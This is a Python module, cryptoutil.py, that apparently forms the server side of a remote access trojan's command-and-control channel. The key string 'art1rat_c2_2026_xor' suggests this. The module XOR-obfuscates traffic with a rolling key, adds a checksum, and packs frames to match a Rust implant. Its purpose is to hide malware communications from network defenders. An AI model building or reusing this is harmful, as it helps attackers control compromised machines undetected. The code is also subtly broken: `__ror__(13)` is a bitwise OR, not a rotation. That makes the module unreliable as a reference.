"""
cryptoutil.py - Server-side traffic obfuscation matching the Rust cryptoutil.
Provides XOR rolling-key obfuscation with checksum verification.
"""

import struct

KEY_STATIC = b"art1rat_c2_2026_xor"


def _rolling_key(seq: int) -> int:
    mask = 0xFFFFFFFFFFFFFFFF
    return ((seq * 0x9E3779B97F4A7C15) & mask).__ror__(13) ^ 0xDEADBEEFCAFEBABE


def obfuscate(data: bytes, seq: int) -> bytes:
    rk = _rolling_key(seq)
    out = bytearray()
    for i, b in enumerate(data):
        k = KEY_STATIC[i % len(KEY_STATIC)]
        k ^= (rk >> ((i % 8) * 8)) & 0xFF
        k ^= (seq >> ((i % 4) * 8)) & 0xFF
        out.append(b ^ k)
    return bytes(out)


def deobfuscate(data: bytes, seq: int) -> bytes:
    return obfuscate(data, seq)


def checksum(data: bytes) -> int:
    h = 0
    for i in range(0, len(data) - 3, 4):
        val = struct.unpack_from('<I', data, i)[0]
        h ^= val
        h = ((h << 7) | (h >> 25)) & 0xFFFFFFFF
    for i in range(len(data) - (len(data) % 4), len(data)):
        h ^= data[i]
        h = ((h << 7) | (h >> 25)) & 0xFFFFFFFF
    return h


def make_frame(data: bytes, seq: int) -> bytes:
    ob = obfuscate(data, seq)
    ck = checksum(data)
    return struct.pack('<Q', seq) + struct.pack('<I', ck) + ob


def parse_frame(frame: bytes):
    if len(frame) < 12:
        return None
    seq = struct.unpack_from('<Q', frame, 0)[0]
    ck = struct.unpack_from('<I', frame, 8)[0]
    dec = deobfuscate(frame[12:], seq)
    if checksum(dec) != ck:
        return None
    return seq, dec
